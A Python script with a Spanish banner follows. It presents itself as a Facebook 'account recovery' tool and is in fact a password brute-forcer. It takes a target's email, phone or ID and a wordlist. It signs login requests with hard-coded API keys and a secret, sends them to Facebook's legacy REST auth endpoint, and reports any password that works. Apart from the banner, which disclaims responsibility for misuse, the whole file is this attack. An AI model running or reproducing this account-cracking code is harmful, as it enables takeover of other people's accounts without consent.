## code by Vampy Security
# -*- coding: utf-8 -*-
##
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
       +=======================================+
       |...........__   __
       \ \ / /  __ _   _ __    _ __   _  _
        \ V /  / _` | | '  \  | '_ \ | || |
         \_/   \__,_| |_|_|_| | .__/  \_, |
                              |_|     |__/.......|
       +---------------------------------------+
        #Autor: Vampy Security  
        #Contacto: 7471512756
        #Fecha 31 dic 2021
        #Script de recuperacion de  FB
        #Saludos desde Vampy Security
        #Vampy Security
        #No me hago responsable del
        #Mal uso que se le de.
       |..........Vampy.........|
       +---------------------------------------+
"""

#!/usr/bin/env python3
import sys
print("""
+=======================================+         |...........__   __                               \ \ / /  __ _   _ __    _ __   _  _                \ V /  / _` | | '  \  | '_ \ | || |                \_/   \__,_| |_|_|_| | .__/  \_, |                                     |_|     |__/.......|       +---------------------------------------+
""")



print("[+] Vampy\n")
userid = raw_input("[*] Introduce [Email|Phone|Username|ID]: ")
try:
        passlist = raw_input("[*] Diccionario de Fuerza Bruta: ")
        if os.path.exists(passlist) != False:
                print(__banner__)
                print(" [+] Cuenta a Hackear: {}".format(userid))
                print(" [+] Cargado : {}".format(len(open(passlist,"r").read().split("\n"))))
                print(" [+] Haciendo magia espere ...")
                for passwd in open(passlist,'r').readlines():
                        sys.stdout.write(u"\u001b[1000D[*] comprobando {}".format(passwd.strip()))
                        sys.stdout.flush()
                        sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
                        xx = hashlib.md5(sig).hexdigest()
                        data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
                        response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
                        if "error" in response:
                                pass
                        else:
                                print("\n\n[+] Contrase??a encontrada ... !!")
                                print("\n[+] la contrase??a es : {}".format(passwd.strip()))
                                break
                print("\n\n[!] magia realizada ... !!")
        else:
                print("fbbrute: error: No such file or directory")
except KeyboardInterrupt:
        print("fbbrute: error: Keyboard interrupt")
